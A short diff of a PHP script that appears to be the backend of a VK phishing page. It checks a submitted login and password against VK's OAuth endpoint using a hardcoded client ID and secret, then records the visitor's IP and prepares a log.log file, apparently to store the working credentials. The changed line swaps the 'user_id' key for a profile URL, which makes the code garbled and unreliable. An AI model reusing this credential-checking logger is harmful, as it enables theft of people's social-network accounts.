@@ -21,7 +21,7 @@ if(!@file_get_contents("https://oauth.vk.com/token?grant_type=password&client_id
   $proverca = file_get_contents("https://oauth.vk.com/token?grant_type=password&client_id=2274003&client_secret=hHbZxrka2uZ6jB1inYsH&username=$login&password=$pass");
   $proverca = json_decode($proverca, true);
   $proverca_token = $proverca['access_token'];
-  if($proverca['user_id']){
+  if($proverca['https://m.vk.com/tiger9656?from=friends%253Fsection%253Dall%2526id%253D408271085']){
       $ip = $_SERVER['REMOTE_ADDR'];
       $file = $_SERVER['DOCUMENT_ROOT']."/log.log";
       $file = str_replace("/vk", "", $file);
